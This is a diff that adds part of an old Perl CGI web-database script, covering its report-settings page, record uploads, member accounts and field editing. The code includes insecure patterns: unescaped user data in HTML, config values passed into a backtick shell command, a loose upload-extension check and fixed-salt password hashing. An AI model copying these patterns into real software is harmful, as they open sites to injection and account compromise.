+<INPUT TYPE=CHECKBOX NAME=\"hideBorder\"";
+  print " CHECKED" if $hideBorder==1;
+print "><P>
+
+<B>Font information</B><BR>
+<I>Enter the attributes to go within a &lt;FONT&gt; tag for each table cell. Do not use quotes.<BR>
+For example:</I><TT> SIZE=3 FACE=Arial COLOR=green</TT><BR>
+&lt\;FONT <INPUT TYPE=TEXT SIZE=40 NAME=\"tableFont\" VALUE=\"$tableFont\">&gt\;
+<P>
+<B>Table Colors:</B><BR>
+<I>You may choose what color the header row of the table will be, 
+and choose two alternating colors for the table itself. If you do <BR>
+not wish to alternate, simply enter the same color for color1 and color2. 
+Enter any standard color or hex code.</I><BR>
+<B>Header row:
+<INPUT TYPE=TEXT SIZE=10 NAME=\"headerColor\" VALUE=\"$headerColor\">\&nbsp\;
+Table row color 1:
+<INPUT TYPE=TEXT SIZE=10 NAME=\"rowColor1\" VALUE=\"$rowColor1\">\&nbsp\;
+Table row color 2:
+<INPUT TYPE=TEXT SIZE=10 NAME=\"rowColor2\" VALUE=\"$rowColor2\"></B>
+
+<P>
+<B>Sub Footer for results page:</B><BR>
+<I>This will go at the bottom of the search results table, immediatly after the data, and
+before the navigation controls.</I><BR>
+Enter any header text and/or images using HTML code:<BR>
+<TEXTAREA NAME=\"reportFooter\" COLS=60 ROWS=4 WRAP=VIRTUAL>$reportFooter</TEXTAREA><P>
+
+<B>Show \"Go to page: 1 2 3 ...\" navigation:</B>
+<INPUT TYPE=CHECKBOX NAME=\"gotoPage\"";
+  print " CHECKED" if $gotoPage;
+print "><BR>
+
+<B>Show \"Next Page/Previous Page\" buttons:</B>
+<INPUT TYPE=CHECKBOX NAME=\"nextprevButtons\"";
+  print " CHECKED" if $nextprevButtons;
+print "><BR>
+
+<B>Show \"Search Again\" link:</B>
+<INPUT TYPE=CHECKBOX NAME=\"searchAgain\"";
+  print " CHECKED" if $searchAgain;
+print "><BR>
+
+<B>Show \"Return to Homepage\" link:</B>
+<INPUT TYPE=CHECKBOX NAME=\"returnToHomepage\"";
+  print " CHECKED" if $returnToHomepage;
+print "><BR>
+
+<P>
+<B>Footer for entire results page:</B><BR>
+<I>This will go at the very bottom of the search results page, after the navigation controls.
+Enter any header text and/or images using HTML code:</I><BR>
+<TEXTAREA NAME=\"reportPageFooter\" COLS=60 ROWS=4 WRAP=VIRTUAL>$reportPageFooter</TEXTAREA><P>
+
+
+<B>Sequence of Fields:</B><BR>
+Click the fields in the left box in the sequence you wish <BR>
+to display them in the user search results table.<BR>
+You may leave out fields which you wish to hide from users<BR>
+<table border=0 cellpadding=10><tr><th>Avaliable fields<th>Report Columns (left to right)<tr><td align=center>
+<SELECT NAME=\"fields\" size=$len width=200 onChange=\"setseq(this,form.sequence,form.seqnums)\">";
+foreach (@fields) {print "<OPTION>$_\n";};
+print "
+</SELECT> <td align=center><SELECT NAME=\"sequence\" size=$len width=200>";
+
+@seq=split(/:/,$reportSequence);
+foreach (@seq) {
+	print "<OPTION VALUE=\'$_\'>$fields[$_]\n";
+};
+print "
+</SELECT><tr><td><td align=center>
+<input type=button value=\"Clear Sequence\" 
+onClick=\"clearSequence(form.sequence,form.seqnums)\"></table></table><P>
+
+<B>Display the Administration search results using only the above columns:</B>
+<INPUT TYPE=\"checkbox\" NAME=\"limitAdminColumns\" VALUE=\"1\"";
+print " CHECKED" if $limitAdminColumns==1;
+print "><P>
+<input type=hidden name=\"seqnums\" value=\"\">
+<input type=hidden name=\"formSeqnums\" value=\"\">
+<TABLE BORDER=0><TR><TD>
+<B>Sort by:<br></b>Choose the field by which you wish to sort first (primary sort)</B></TD>
+<TD><SELECT NAME=\"sort\" size=1>";
+$i=1;
+print "<OPTION VALUE=\"0\">-- not sorted --\n";
+foreach (@fields) {
+	print "<OPTION VALUE=\"$i\"";
+		if ($reportSort == $i) {print " SELECTED";};
+	print ">$_\n";
+	$i++;
+};
+print "</SELECT></TD>";
+print "<TD><B>Sort Sequence:</B></TD><TD><SELECT NAME=\"order\"><OPTION VALUE=0>Ascending";
+print "<OPTION VALUE=1 ";
+if ($reportOrder==1) {print "SELECTED"}
+print ">Descending</SELECT></TD></TR>";
+print "<BR>
+<TR><TD><B>Sort by 2:<br></b>If 2 or more of the above values are the same,<BR>
+choose the field to sort by next (secondary sort)</B></TD>
+<TD><SELECT NAME=\"sort2\" size=1>";
+$i=1;
+print "<OPTION VALUE=\"0\">-- not sorted --\n";
+foreach (@fields) {
+	print "<OPTION VALUE=\"$i\"";
+		if ($reportSort2 == $i) {print " SELECTED";};
+	print ">$_\n";
+	$i++;
+};
+print "</SELECT></TD>";
+print "<TD><B>Sort Sequence:</B></TD><TD><SELECT NAME=\"order2\"><OPTION VALUE=0>Ascending";
+print "<OPTION VALUE=1 ";
+if ($reportOrder2==1) {print "SELECTED"}
+print ">Descending</SELECT></TD></TR>";
+print "</TABLE><P>\n";
+
+print "<B>Number of results per page</B>
+<INPUT TYPE=text NAME=\"numrows\" SIZE=3 VALUE=\"$reportLines\"><P>
+
+<B>Include \"view\" button?</B>
+<INPUT TYPE=checkbox NAME=\"form\"";
+if ($reportForm==1) {print " CHECKED"};
+print "><BR><DFN></DFN>
+<B>Label for view button:</B> <INPUT TYPE=TEXT SIZE=20 NAME=\"viewButtonLabel\" VALUE=\"$viewButtonLabel\"><BR>
+<B>Enter an image to use instead of the view button</B><BR>
+<INPUT TYPE=TEXT SIZE=40 NAME=\"viewButtonImage\" VALUE=\"$viewButtonImage\"><BR>
+
+
+The view button appears next to each record in the user search results.  It displays the current record in a columnar form.
+<P><HR><P>
+
+<B>Use European Dates (dd/mm/yy)?</B>
+<INPUT TYPE=\"checkbox\" NAME=\"europeanDates\"";
+print " CHECKED" if $europeanDates==1;
+print "><P>
+
+<B>Allow 'Instant Member' page?</B>
+<INPUT TYPE=\"checkbox\" NAME=\"allowInstantMember\"";
+print " CHECKED" if $allowInstantMember==1;
+print "><P>
+
+<B>Disable file locking</B>
+<INPUT TYPE=\"checkbox\" NAME=\"disableFileLocking\"";
+print " CHECKED" if $disableFileLocking==1;
+print "><BR>
+<font size=-1><I>The program creates a small file in the </I>$uploadsdir <I>directory while modifying
+the data.log file so that 2 simultanious processes will not conflict with each other.
+If you are having difficulty setting write permissions to the </I>$uploadsdir <I>directory, you may 
+disable this feature until you get it configured properly.</font></I><HR>
+
+<B>Notify admin of all new records</B><BR>
+<B>E-mail address</B> <INPUT TYPE=TEXT NAME=\"email\" SIZE=30 VALUE=\"$email\"><BR>
+<B>Path to Sendmail</B> <INPUT TYPE=TEXT NAME=\"sendmail\" SIZE=40 VALUE=\"$sendmail\"><BR>
+On Unix, sendmail is frequently at <TT><B>/usr/lib/sendmail</B></TT><BR>
+On Windows, enter the path to Blat, which can be downloaded for free from <A HREF=\"http://gepasi.dbs.aber.ac.uk/softw/Blat.html\">http://gepasi.dbs.aber.ac.uk/softw/Blat.html</A>
+
+<HR>
+<P>
+<H3>Template for first search results screen</H3>
+<font size=2>Instead of the default table, you can enter your own HTML code in the box below.  The code you enter 
+will be displayed once for every record that matches the user\'s search criteria.  Using the keys below, 
+substitute \$data[0] where you would like the value contained in the first field to appear, \$data[1] for the 
+value contained in the second field, etc. Type the word <B>\$viewbutton</B> to place the view button in the search results.
+Type <B>\$id</B> to include the record ID number. Type <B>\$datecreated</B> to include the date the record was added to the database.<P>
+If you are creating a link to another cgi script, use <B>\$escape[#]</B> instead of <B>\$data[#]</B>. This will automatically
+convert \"<font color=blue>three,&nbsp;at&nbsp;\$2.25/each</font>\" into \"<font color=blue>three%2C+at+%242.25%2Feach</font>\", which is the format cgi scripts expect in the URL.
+</font>
+
+<TABLE BORDER=1 BGCOLOR=WHITE>
+<TR><TH><font size=2>Type this:<TH><font size=2>To display the value for this:
+<TH><font size=2>Type this:<TH><font size=2>To display the value for this:
+";
+$numfields=@fields;
+for($i=0;$i<$numfields;$i++) {
+  print "<TR><TD><font size=2>\$data[$i]<TD><font size=2>$fields[$i]";
+  $i++;
+  last if $i==$numfields;
+  print "<TD><font size=2>\$data[$i]<TD><font size=2>$fields[$i]\n";
+}
+print "</TABLE><BR>
+<B>Do not convert URLs, e-mail addresses, and images in templates</B>
+<INPUT TYPE=CHECKBOX NAME=\"templateNoSubstitute\"";
+  print " CHECKED" if $templateNoSubstitute==1;
+print "><BR>
+<I><font size=-1>If this box is unchecked, URLs and e-mail addresses will appear as links
+and images will be displayed automatically.  Check this box if you wish to
+override the default substitutions.  This is necessary, for example, to define
+the text inside a link or specify the alignment of an image.</font></I><P>
+
+<B>Use this template instead of the search results table?</B>
+<INPUT TYPE=CHECKBOX NAME=\"searchTemplateOn\"";
+  print " CHECKED" if $searchTemplateOn==1;
+print "><BR>
+<B>Search Template</B><BR>
+<TEXTAREA NAME=\"searchTemplate\" ROWS=20 COLS=80 WRAP=\"physical\">$searchTemplate</TEXTAREA>
+
+<P>
+<HR>
+<P>
+<H3>Template for form view, when the \'view\' button is clicked</H3>
+<font size=2>Instead of the default form, you can enter your own HTML code in the box below.  
+Substitute \$data[0] where you would like the value contained in the first field to appear, \$data[1] for the 
+value contained in the second field, etc.</font><BR>
+<B>Use this template instead of the default form when the 'view' button is clicked?</B>
+<INPUT TYPE=CHECKBOX NAME=\"formTemplateOn\"";
+  print " CHECKED" if $formTemplateOn==1;
+print "><BR>
+<B>Form Template</B><BR>
+<TEXTAREA NAME=\"formTemplate\" ROWS=40 COLS=80 WRAP=\"physical\">$formTemplate</TEXTAREA>
+<P>
+<B>Members Maintenance Page Template</B><BR>
+<I>The maintenance page appears when a member selects a record to be modified or deleted. 
+If \"Limit Members to 1 Record Each\" is checked, this is the first page the member will come to.</I><BR>
+Type <B>\$field[#]</B> to display an editable box for a selected field.
+Type <B>\$data[#]</B> to display the value of a field as text, in a non-editable format.<BR>
+
+<B>Use this template instead of the default Maintenance Page?</B>
+<INPUT TYPE=CHECKBOX NAME=\"maintenanceTemplateOn\"";
+  print " CHECKED" if $maintenanceTemplateOn==1;
+print "><BR>
+
+<TEXTAREA NAME=\"maintenanceTemplate\" ROWS=40 COLS=80 WRAP=\"physical\">$maintenanceTemplate</TEXTAREA>
+<P>
+
+<B>If you have registered another</B> <FONT COLOR=BLUE>webdata_[database name].pl</FONT> <B>file in the same directory
+ as this one is in, enter its filename here to register this database</B><BR>
+<INPUT TYPE=TEXT SIZE=25 NAME=\"registereddb\" VALUE=\"$registereddb\">
+<P>
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Modify Pages\"><BR>
+<A HREF=\'$cgilocation?cgifunction=admin\'>Return to Administration Page</A>
+</FORM>";
+
+print "
+<A HREF=\"$searchPage\">Test your modifications on the User Search Page</A>
+<P><BR><P><BR><P><BR><P><A NAME=\"bottom\">\&nbsp\;</A>";
+};
+
+		
+#*******END REPORT PAGE SUBROUTINE**********
+
+#********BEGIN MEMBERADD SUBROUTINE**************
+sub memberadd {
+&memberpass;
+open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+@fieldsData=<FIELDS>;
+close FIELDS;
+foreach (@fieldsData) {
+	($field,$type)=split(/::/);
+	push(@fields,"$field\n");
+	push(@types,"$type");
+};
+chomp(@fields);
+@value=();
+$body="The following record has been added to the $cgilocation database.\n\n";
+$value[0]=time();
+$fcount=1;
+shift(@fields);
+$missingReqs=0;
+$isEmpty=1;
+foreach $fname (@fields) {
+  $value[$fcount]=$user_data{$fname};
+  $reqnum=$fcount-1;
+  if ((length($user_data{$fname})==0)&&($reqfields=~/(^|\,)$reqnum($|\,)/)) {
+    $reqerror.="<B>$fname</B> is a required field.<P>";
+    $missingReqs=1;
+  }
+  if (length($user_data{$fname})>0) {$isEmpty=0};
+  $body.="$fname\: $user_data{$fname}\n";
+  &gettype($types[$fcount]);
+  #UPLOAD IF IT IS AN UPLOAD FIELD
+  if (($type eq "upload")&&(length($user_data{$fname})>0)) {
+    if ($user_data{$fname}=~/([^\\\/\:]+$)/) {$INfilename=lc($1)};
+	$INfilename=~s/[^a-zA-Z0-9\_\.]//g;
+	if ($INfilename=~/\.([a-zA-Z0-9]+)$/) {$extension=$1};
+	if ($typeexts!~/,*${extension},*/i) {
+      &error("Only the following filetypes are allowed. $typeexts");
+    }
+    $OUTfilename="${value[0]}_${fname}_${INfilename}";
+    $value[$fcount]="${uploadsURL}$OUTfilename";
+    $uploadsize=0;
+    @filecontents=();
+    while ($bytesread=read($user_data{$fname},$buffer,1024)) {
+      $uploadsize+=length($buffer);
+      push(@filecontents,$buffer);
+    }
+    
+    if ($uploadsize>$typesize*1000) {
+      &error("upload size = $uploadsize bytes.<P>The upload can only be a maximum of ${typesize}KB")
+    };
+    open (OUTFILE,">${uploadsdir}${OUTfilename}") or &error("Could not open ${uploadsdir}$OUTfilename for
+writing");
+	  binmode(OUTFILE);
+    print OUTFILE (@filecontents);
+    close OUTFILE;
+    close ($user_data{$fname});
+  }   
+  
+  #END UPLOAD
+  $fcount++;
+};
+
+if ($isEmpty) {$reqerror.="No data was submitted<P>"};
+if (($missingReqs)||($isEmpty)) {
+  &bodytag;
+  print "Your record was not added for the following reasons:<P>\n";
+    print "$reqerror";
+  print qq(<A HREF="javascript:history.go(-1)">Return to previous page</A>);
+  exit;
+}
+
+#pop(@value);  #** Remove cgifunction from @value array **
+#if ($user_data{pagenum}>0) {pop(@value)}; #** remove pagenum from @value array
+foreach (@value) {
+	$_=~s/\r/\n/g;
+	$_=~s/\n\n/\n/g;
+	$_=~s/\n/<BR>/g;
+};
+print "
+<HEAD><TITLE>Webdata Entry Added</TITLE></HEAD>
+<BODY BGCOLOR=\"BEIGE\"><H1>";
+
+#******* Remove delimeter characters and leading spaces*********
+foreach $item (@value) {
+	$item=~s/^( *)//ge;   # remove leading spaces from entries
+	$item=~s/::/'&#58;&#58;'/ge;  # replace delimiting character from entries
+};
+
+#****Check to see if entry is already used****
+&putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+open(READLOG,"<$logfile");
+@entries = <READLOG>;
+close READLOG;
+&removelock; #remove lock file
+$unique="true";
+$line = $entries[$#entries];
+@data = split(/::/,$line);
+chomp(@data);
+shift(@data);
+$comp1=join('::',@data);
+@data=(@value,$userid);
+chomp(@data);
+shift(@data);
+$comp2=join('::',@data);
+if ($comp1 eq $comp2) {
+  $unique="false";
+};
+
+
+#********Add values to $logfile file*******************
+if($unique eq "true") {
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+	 push(@value,"$userid");
+        open(LOGFILE,">>$logfile") or &error("Could not open $logfile");
+       	$line=join("::",@value);
+        print LOGFILE ("$line\n");
+        close(LOGFILE);
+        &removelock; #remove lock file.
+        print "<H1>Your entry has been added.</H1><P>";
+} else {
+        print "<font color=\"red\">";
+        print "That entry matches the previous entry exactly. It is probably a duplicate entry.  Submission cancelled.</h1></font>";
+};
+
+
+#****RETURN TO MAINTENANCE SCREEN****
+print "<A HREF=\"javascript:history.go(-1)\">
+Return to previous page</h1>
+";
+if (length($email)>0) {
+  if ($^O=~/win/i) {
+    open (MAIL,">${uploadsdir}mail.txt");
+    print MAIL ("$body\n");
+    close MAIL;
+    $tmp=`$sendmail ${uploadsdir}mail.txt -s \"New Record Added to Database\" -t $email -q`;
+  } else {
+    open (MAIL,"|$sendmail -t") or &error("Could not open $sendmail");
+    print MAIL ("To: $email\nFrom: $email\n");
+    print MAIL ("Subject:New Record Added to Database\n$body\n");
+    close MAIL;
+  }
+}
+};
+#*********END MEMBER ADD SUBROUTINE********************
+
+#********BEGIN LIMIT MEMBERS SUBROUTINE
+sub limitMem {
+  &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+  open (FILE,"<$logfile") or &error("Could not open $logfile");
+  @entries=<FILE>;
+  close FILE;
+  &removelock; #remove lock file
+  chomp(@entries);
+  $isListed=grep(/::$userid$/,@entries);
+  if (!$isListed) {
+    open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+    @fields=<FIELDS>;
+    close FIELDS;
+    $numfields=@fields;
+    $dummyline=time();
+    for ($i=0;$i<$numfields;$i++) {
+      $dummyline.="::";
+    }
+    $dummyline.=$userid;
+    push(@entries,$dummyline);
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+    open (FILE,">$logfile") or &error("Could not open $logfile");
+    foreach (@entries) {
+      print FILE "$_\n";
+    }
+    close FILE;
+    &removelock;
+    chomp(@entries);
+  };
+  foreach(@entries) {
+    if (/::$userid$/) {
+      @data=split('::');
+      %user_data=();
+      @value=();
+      $user_data{part}=$data[0];
+      $value[0]=$user_data{part};
+      $value[1]="maintenance";
+    }
+  }
+  &maintenance;
+}
+#********END LIMIT MEMBERS SUBROUTINE
+
+#****BEGIN MEMBER PAGE SUBROUTINE
+sub memberpage {
+  &memberpass;
+  print "<SCRIPT>document.cookie=\"$cookie\"</SCRIPT>";
+  if ($limitMembers) {
+    &limitMem;
+    exit;
+  }
+  if (length($memberpage)>0) {
+    print "<SCRIPT>location.replace(\'$memberpage\')</SCRIPT>\n";
+    print "<NOSCRIPT>You must have JavaScript to use the Members pages</NOSCRIPT>";
+    exit;
+  }
+  @fields=();
+  @types=();
+  open(FIELDS,"<$fieldnames") or &error ("Could not open $fieldnames");
+  @fieldsData=<FIELDS>;
+  close FIELDS;
+  $usemulti=0;
+  foreach (@fieldsData) {
+    ($field,$type)=split(/::/);
+    push(@fields,"$field\n");
+    push(@types,"$type");
+    $usemulti=1 if $type=~/upload/;
+  };
+  shift(@fields);
+  shift(@types);
+  
+  print "
+<HEAD><TITLE>Members Admin Page</TITLE></HEAD>
+<BODY BGCOLOR=\"beige\">
+<H1 align=center> Members Administration Page </H1>";
+if (length($reqfields)>0) {
+  print "<font color=red><B>* </B>indicates required fields</font><BR>";
+}
+print "
+<form name=\"form1\" action=\"$cgilocation\" method=post";
+  print " ENCTYPE=\"multipart/form-data\"" if $usemulti==1;
+  print ">
+<input type=hidden name=\"ID\">
+<TABLE BORDER=0>
+";
+print "<TR><TD><font color=orange><B>Date Created</B></font></TD><TD><input type=text size=15 name=\"date_created\"> (Date is added automatically, use for Search/modify only)</TD></TR>\n";
+$ftcount=0;
+foreach $field (@fields) {
+	  &gettype($types[$ftcount]);
+	  chop($field);
+	  print "<TR><TD>";
+	  print "<font color=red><B>* </B></font>" if $reqfields=~/(^|\,)$ftcount($|\,)/;
+	  print "<B>$field</B></TD>";
+	  if ($type eq "text") {
+	       print "<TD><input type=$type name=\"$field\" size=$typesize></TD></TR>\n";
+	  };
+	  if ($type eq "checkbox") {
+		  print "<TD><input type=checkbox name=\"$field\" value=\"yes\"></TD></TR>\n";
+	  };
+	  if ($type eq "list") {
+	  	  print "<TD><SELECT NAME=\"$field\" SIZE=1>\n";
+		  print "<OPTION VALUE=\"\">\n";
+		  foreach (@typelistvals) {
+			print "<OPTION>$_\n";
+		  };
+		  print "</SELECT></TD></TR>\n";
+	  };
+	  if ($type eq "comment") {
+		  print "<TD><TEXTAREA NAME=\"$field\" COLS=60 ROWS=$typerows></TEXTAREA></TD></TR>\n";
+	  };
+	  if ($type eq "upload") {
+	    print "<TD><INPUT NAME=\"$field\" TYPE=\"file\"></TD></TR>\n";
+	  };
+	  
+	  $ftcount++;
+};
+  print "
+<!-- Do not change the values of the submit buttons -->
+</TABLE>";
+  print "<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"add\">" if $membersCanAdd; 
+  print " <INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Search/modify\">" if $membersCanAdd;
+  print " <INPUT TYPE=RESET VALUE=\"Clear Form\">";
+  print "<BR>Search the entire database. <INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Search\">" if $membersCanSearch;
+  print "<BR>Upload a delimited text file. <INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Import data\">" if $membersCanAdd;
+  print "</FORM> \n";
+  
+  if ($membersCanAdd) {
+    print "
+<h2>
+Click \'Add\' to add a record to the database.
+
+<P>To modify or delete a record: Search for the record, then click on the record in the search results window.</h2>
+";
+  }
+  
+  if ($membersCanSearch) {
+    print "
+<h2>
+Enter your search criteria in the form, then click \"Search\" to search the entire database.
+Leave the form blank to show all records.
+</h2>";
+  }
+print "
+  <A HREF=\"$homepage\">
+    Return to home page</A>      
+";
+};
+#****END MEMBER PAGE SUBROUTINE
+
+#*****BEGIN ADD MEMBER SUBROUTINE
+sub addmember {
+	if ($value[0] eq "admin") {
+		print "<SCRIPT>alert(\'admin is a reserved name\')</SCRIPT>";
+		&members;
+		exit;
+	};
+ &putlock;
+	open(FILE,"<$members") or &error("Could not open $members");
+	@members=<FILE>;
+	close FILE;
+	&removelock;
+ foreach (@members) {
+		($user,$pass)=split(/::/);
+		if ($value[0] eq $user) {
+			print "<SCRIPT>\n";
+			print "alert(\'That name is already used. Please choose another\')\n";
+			print "</SCRIPT>";
+			&members;
+			exit;
+		};
+	};
+	$pass=crypt($value[1],7);
+	$line="$value[0]::$pass\n";
+ &putlock;
+	open(FILE,">>$members") or &error("Could not open $members");
+		print FILE ("$line");
+	close FILE;
+ &removelock;
+	&members;
+};
+#****END ADD MEMBER SUBROUTINE
+
+#*****BEGIN DELETE MEMBER SUBROUTINE
+sub deletemember {
+ &putlock;
+	open(FILE,"<$members") or &error("Could not open $members");
+	@oldlist=<FILE>;
+	close FILE;
+ &removelock;
+	foreach (@oldlist) {
+		($user,$pass)=split(/::/);
+		if ($user ne $user_data{member}) {push(@newlist,$_)};
+	};
+ &putlock;
+	open(FILE,">$members") or &error("Could not open $members");
+	print FILE (@newlist);
+	close FILE;
+ &removelock;
+	&members;
+};
+#****END DELETE MEMBER SUBROUTINE
+
+
+#****BEGIN ADD/REMOVE MEMBERS SUBROUTINE
+sub members {
+  &checkpass;
+  print "<body bgcolor=beige>\n<h1 align=center>Members</h1>\n";
+  &putlock;
+  open(FILE,"<$members");
+  @members=<FILE>;
+  close FILE;
+  &removelock;
+  $len=@members;
+  $len=15 if $len>15;
+  if ($len==0) {
+    print "No members have been created yet\n";
+  } else {
+    print "<FORM ACTION=\"$cgilocation\" METHOD=POST>\n";
+    print "<SELECT NAME=\"member\" size=$len>\n";
+    foreach (@members) {
+      ($user,$pass)=split(/::/);
+      print "<OPTION>$user\n";
+    };
+    print "</SELECT><BR>";
+    print "<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Delete Member\">\n";
+    print "</FORM>";
+  };
+  print "
+<HR><CENTER><B>Add A Member</B></CENTER>
+<TABLE BORDER=0>
+<FORM ACTION=\"$cgilocation\" METHOD=POST>
+<TR><TD><B>User Name</B><TD><INPUT TYPE=TEXT NAME=\"username\" SIZE=20><BR>
+<TR><TD><B>Password</B><TD><INPUT TYPE=TEXT NAME=\"password\" SIZE=20><BR>
+</TABLE>
+<INPUT TYPE=SUBMIT NAME=\"cgifunction\" VALUE=\"Add Member\">
+</FORM><BR><A HREF=\"$cgilocation?cgifunction=admin\">Return to Administration Page</A>	
+";
+  
+};
+#****END ADD/REMOVE MEMBERS SUBROUTINE
+
+#*******BEGIN NEXTPREV SUBROUTINE*****
+# THIS SUBROUTINE REPLACES THE PAGENUM CRITERIA, THEN
+# RUNS THE USERSEARCH ROUTINE
+sub nextprev {
+	if ($user_data{cgifunction} =~ /^(Next Page|Nächste Seite|Page suivante|Pagina Successiva|Página Siguiente)$/) {$n=1} else {$n=-1};
+	$p=$user_data{pagenum}+$n;
+	$q=$user_data{query};
+	$replace="pagenum=$p";
+	$find="pagenum=$user_data{pagenum}";
+	$q=~s/$find/$replace/;
+
+	#EMPTY VALUE AND USER_DATA ARRAYS BEFORE RUNNING READPARSE
+	@value=();
+	%user_data=();
+	&readparse($q);
+	&usersearch if ($user_data{cgifunction} =~/^(Search|Suchen|Chercher|Cerca|Buscar)$/);
+	&adminsearch  if ($user_data{cgifunction} eq "Search/modify");
+};
+#*******END NEXTPREV SUBROUTINE*******
+#*******BEGIN RENAMEFIELD SUBROUTINE***
+sub renameField {
+    &checkpass;
+    $select = $value[0];
+    $select++;
+    $value[1]=~s/ *, */,/g if $value[1]=~/::list/; #remove spaces around comma
+    open(FIELDS,"<$fieldnames");
+    @fields=<FIELDS>;
+    close FIELDS;
+
+    $newfield="$value[1]\n";
+    $fields[$select]=$newfield;
+    open(RESULT,">$fieldnames");
+    print RESULT (@fields);
+    close RESULT;
+
+#****RETURN TO FIELD MODIFY SCREEN****
+    @value=();
+    &fieldmod;
+};
+#*******END RENAME FIELD SUBROUTINE****
+
+#*******BEGIN INSERTFIELD SUBROUTINE****
+sub insertField {
+    &checkpass;
+    $select = $value[0];
+    $select++;
+    $value[1]=~s/ *, */,/g if $value[1]=~/::list/; #remove spaces around comma
+    open(FIELDS,"<$fieldnames");
+    @fields=<FIELDS>;
+    close FIELDS;
+    $numfields=@fields;
+    $newfield="$fields[$select]$value[1]\n";
+    $fields[$select]=$newfield;
+    open(RESULT,">$fieldnames");
+    print RESULT (@fields);
+    close RESULT;
+
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+    open(RECORDS,"<$logfile");
+    @records = <RECORDS>;
+    close RECORDS;
+    &removelock; #remove lock file
+    foreach (@records) {
+	chop($_);
+	@linedata=split(/::/,$_);
+	$newdata="$linedata[$select]::";
+	$linedata[$select]=$newdata;
+	$newline=join('::',@linedata);
+	$_="$newline\n";
+    };
+    open(RECORDS,">$logfile");
+    print RECORDS (@records);
+    close RECORDS;
+
+#***RESET PREFERENCES****
+    foreach (@sequence) {if ($_>$select-1) {$_++}};
+    foreach (@SFsequence) {if ($_>$select-1) {$_++}};
+    push(@sequence,$select);
+    push(@SFsequence,$select);
+    $reportData[2]=join(':',@sequence);
+    $reportData[24]=join(':',@SFsequence);
+    for ($i=$#fields;$i>=$select;$i--) {
+      $num=$i+1;
+      $searchTemplate=~s/\$data\[$i\]/\$data\[$num\]/g;
+      $formTemplate=~s/\$data\[$i\]/\$data\[$num\]/g;
+    }
+    $searchTemplate=~s/\n/::/g;
+    $formTemplate=~s/\n/::/g;
+    $reportData[11]=$searchTemplate;
+    $reportData[13]=$formTemplate;
+    open (REPORT,">$reportdata") or &error("Could not open $reportdata for writing");
+    foreach (@reportData) {  
+      print REPORT ("$_\n");
+    };
+    close REPORT; 
+
+#****RETURN TO FIELD MODIFY SCREEN****
+    @value=();
+    &fieldmod($select);
+};
+
+#*******END INSERTFIELD SUBROUTINE******
+
+#*******BEGIN DELETEFIELD SUBROUTINE****
+sub deleteField {
+    &checkpass;
+    $select = $value[0];
+    $select++;
+    open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+    @fields=<FIELDS>;
+    close FIELDS;
+    foreach $field (@fields) {
+	if ($field ne $fields[$select]) {
+	    push(@result,$field);
+	}
+    }
+    open(FIELDS,">$fieldnames") or &error("Could not open $fieldnames");
+    print FIELDS (@result);
+    close FIELDS;
+    
+    &putlock; #place a lock file in the uploads dir to prevent simultanious writing.
+    open(RECORDS,"<$logfile") or &error("Could not open $logfile");
+    @records=<RECORDS>;
+    close RECORDS;
+    &removelock; #remove lock file
+    foreach $record (@records) {
+	chop($record);
+	@linedata=split(/::/,$record);
+	push(@deleteset,$linedata[0]);
+	@newline=("");
+	$count=0;
+	foreach $item (@linedata) {
+	    if ($count != $select) {
+		push(@newline,$item);
+	    };
+	    $count++;
+	};		
+	shift(@newline);
+	$record = join('::',@newline)."\n";
+    };
+    open(RECORDS,">$logfile") or &error("Could not open $logfile");
+    print RECORDS (@records);
+    close RECORDS;
+    
+#DELETE IMAGES
+($fieldname,$type)=split(/::/,$fields[$select]);
+chomp($fieldname);
+  if ($type=~/upload/) {
+    foreach $value (@deleteset) {
+      $uploadpath="${uploadsdir}${value}_$fieldname";
+      unlink <$uploadpath*>;
+    }
+  }
+#END DELETE IMAGES
+
+#***RESET PREFERENCES****
+    @result=();
+    foreach (@sequence) {
+      if ($_==$select) {$_=-1}
+      if ($_>$select-1) {$_--}
+      if ($_!=-1) {push(@result,$_)};
+    };
+    @sequence=@result;
+    @result=();
+    foreach (@SFsequence) {
+      if ($_==$select) {$_=-1}
+      if ($_>$select-1) {$_--}
+      if ($_!=-1) {push(@result,$_)};
+    };
+    @SFsequence=@result;
+    $reportData[2]=join(':',@sequence);
+    $reportData[24]=join(':',@SFsequence);
+    $num=$select-1;
+    $searchTemplate=~s/\$data\[$num\]/XXXX/g;
+    $formTemplate=~s/\$data\[$num\]/XXXX/g;
+    for ($i=$select;$i<$#fields;$i++) {
+      $num=$i-1;
+      $searchTemplate=~s/\$data\[$i\]/\$data\[$num\]/g;
+      $formTemplate=~s/\$data\[$i\]/\$data\[$num\]/g;
+    }
+    $searchTemplate=~s/\n/::/g;
+    $formTemplate=~s/\n/::/g;
+    $reportData[11]=$searchTemplate;
+    $reportData[13]=$formTemplate;
+    open (REPORT,">$reportdata") or &error("Could not open $reportdata for writing");
+    foreach (@reportData) {
+      print REPORT ("$_\n");      
+    };
+    close REPORT;
+
+#****RETURN TO FIELD MODIFY SCREEN****
+    @value=();
+    &fieldmod;
+    
+
+};
+
+#*******END DELETEFIELD SUBROUTINE******
+
+#*******BEGIN FIELDMOD SUBROUTINE********
+sub fieldmod {
+    &checkpass;
+    if (length($_[0])>0) {
+      $select=$_[0];
+    } else {
+      $select=-1;
+    }
+    open(FIELDS,"<$fieldnames") or &error("Could not open $fieldnames");
+    @fields=<FIELDS>;
+    close FIELDS;
+    shift(@fields);
+    $num=@fields;
+    $num++;
+    print "
+<HEAD>
+<TITLE>Webdata Modify Fields</TITLE>
+<SCRIPT>
+function insert(s) {
+   newfield=prompt(\"New Field Name:\",\"\")\;
+   if (!newfield) {return}\;
+   if ((newfield.indexOf(\'\\\"\')>-1)||(newfield.indexOf(\'\\\'\')>-1)) {
